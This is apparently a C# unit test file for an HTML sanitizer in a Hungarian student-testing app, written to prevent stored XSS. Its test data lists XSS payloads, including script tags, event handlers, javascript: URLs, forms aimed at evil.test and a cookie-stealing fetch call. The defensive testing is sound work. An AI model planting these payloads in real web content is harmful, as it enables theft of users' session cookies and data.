using Bunit;

using Microsoft.Extensions.DependencyInjection;
using Microsoft.FluentUI.AspNetCore.Components;

using TeszterLibrary.Components.Teszt;
using TeszterLibrary.Model;
using TeszterLibrary.Services.Html;

namespace TeszterTests.Services.Html
{
    /// <summary>
    /// A tárolt HTML megjelenítéskori tisztítása. Régen a ~20 MarkupString-es helyen a nyers HTML jelent meg,
    /// így egy kérdés- vagy válaszszövegbe írt szkript minden diák böngészőjében lefutott volna (tárolt XSS).
    /// </summary>
    public class SafeHtmlTests
    {
        private const string Png = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";

        [Theory]
        [InlineData("<script>alert(1)</script><p>a</p>", "<script")]
        [InlineData("<img src=x onerror=\"alert(1)\">", "onerror")]
        [InlineData("<a href=\"javascript:alert(1)\">x</a>", "javascript:")]
        [InlineData("<a href=\"JaVaScRiPt:alert(1)\">x</a>", "alert")]
        [InlineData("<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">x</a>", "data:")]
        [InlineData("<img src=\"data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=\">", "data:")]
        [InlineData("<iframe src=\"https://evil.test\"></iframe>", "iframe")]
        [InlineData("<svg><script>alert(1)</script></svg>", "script")]
        [InlineData("<p style=\"background:url(javascript:alert(1))\">a</p>", "javascript")]
        [InlineData("<form action=\"https://evil.test\"><input name=p></form>", "<form")]
        [InlineData("<p>Jelszó: <input type=\"password\" name=\"p\"></p>", "<input")]
        [InlineData("<button formaction=\"https://evil.test\">Küldés</button>", "formaction")]
        [InlineData("<div onclick=\"steal()\">x</div>", "onclick")]
        [InlineData("<object data=\"x.swf\"></object>", "object")]
        [InlineData("<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>", "onerror")]
        public void Dangerous_markup_is_removed(string html, string forbidden)
        {
            var result = SafeHtml.Sanitize(html);

            Assert.DoesNotContain(forbidden, result, StringComparison.OrdinalIgnoreCase);
        }

        [Theory]
        [InlineData("<p><strong>Félkövér</strong> és <em>dőlt</em></p>")]
        [InlineData("<p>x<sup>2</sup> + H<sub>2</sub>O</p>")]
        [InlineData("<ul><li>egy</li><li>kettő</li></ul>")]
        [InlineData("<table><tbody><tr><td>1</td><td>2</td></tr></tbody></table>")]
        [InlineData("<p class=\"ql-align-center\">középre</p>")]
        [InlineData("<ol><li data-list=\"bullet\">a</li></ol>")]
        [InlineData("<img src=\"/uploads/abc.png\" alt=\"kép\">")]
        [InlineData("<a href=\"https://example.org/\">link</a>")]
        public void Editor_formatting_is_kept(string html)
        {
            Assert.Equal(html, SafeHtml.Sanitize(html));
        }

        [Fact]
        public void Inline_colour_survives_in_normalised_form()
        {
            var result = SafeHtml.Sanitize("<p><span style=\"color: red\">piros</span></p>");

            Assert.Equal("<p><span style=\"color: rgba(255, 0, 0, 1)\">piros</span></p>", result);
        }

        [Fact]
        public void Embedded_raster_images_from_older_content_still_show()
        {
            var html = $"<img src=\"{Png}\">";

            Assert.Equal(html, SafeHtml.Sanitize(html));
        }

        [Fact]
        public void A_link_opening_a_new_tab_cannot_reach_the_opener()
        {
            var result = SafeHtml.Sanitize("<a href=\"https://example.org/\" target=\"_blank\">x</a>");

            Assert.Contains("rel=\"noopener noreferrer\"", result);
        }

        [Theory]
        [InlineData(null)]
        [InlineData("")]
        [InlineData("   ")]
        public void Empty_input_gives_empty_markup(string? html)
        {
            Assert.Equal(string.Empty, SafeHtml.Markup(html).Value);
        }

        [Fact]
        public void Truncated_html_is_closed_and_cleaned()
        {
            // NewAssignment_2 az első 40 karaktert mutatja: a félbevágott jelölés nem szivároghat tovább az oldalba.
            var result = SafeHtml.Sanitize("<p><b>hosszú kérdés <img src=x onerror=al");

            Assert.DoesNotContain("onerror", result);
            Assert.EndsWith("</b></p>", result);
        }

        [Fact]
        public void Plain_text_and_entities_are_kept_encoded()
        {
            Assert.Equal("3 &lt; 5 &amp;&amp; 7 &gt; 2", SafeHtml.Sanitize("3 &lt; 5 &amp;&amp; 7 &gt; 2"));
        }

        [Fact]
        public async Task Sanitizing_is_safe_from_many_threads()
        {
            var results = await Task.WhenAll(Enumerable.Range(0, 64).Select(i => Task.Run(() =>
                SafeHtml.Sanitize($"<p onclick=\"x\">{i}<script>y</script></p>"))));

            Assert.All(results.Select((r, i) => (r, i)), x => Assert.Equal($"<p>{x.i}</p>", x.r));
        }

        [Fact]
        public void Tex_fallback_keeps_its_class_for_styling()
        {
            // Ha a képszolgáltatás nem érhető el, az API a képlet forrását ebben a span-ben küldi (component.css: .tex-fallback).
            var html = SafeHtml.Sanitize("<span class=\"tex-fallback\">\\frac{1}{2} + 3 &lt; 4</span> Ł = Ł");

            Assert.Equal("<span class=\"tex-fallback\">\\frac{1}{2} + 3 &lt; 4</span> Ł = Ł", html);
        }

        [Fact]
        public void A_question_card_renders_the_cleaned_text()
        {
            using var ctx = new BunitContext();
            ctx.JSInterop.Mode = JSRuntimeMode.Loose;
            ctx.Services.AddFluentUIComponents();
            var question = new Question { Text = "<p>Mennyi 2+2?</p><img src=x onerror=\"fetch('//evil.test?c='+document.cookie)\"><script>alert(1)</script>" };

            var cut = ctx.Render<Qview>(p => p.Add(c => c.question, question));

            Assert.Contains("<p>Mennyi 2+2?</p>", cut.Markup);
            Assert.DoesNotContain("onerror", cut.Markup);
            Assert.DoesNotContain("<script", cut.Markup);
        }
    }
}
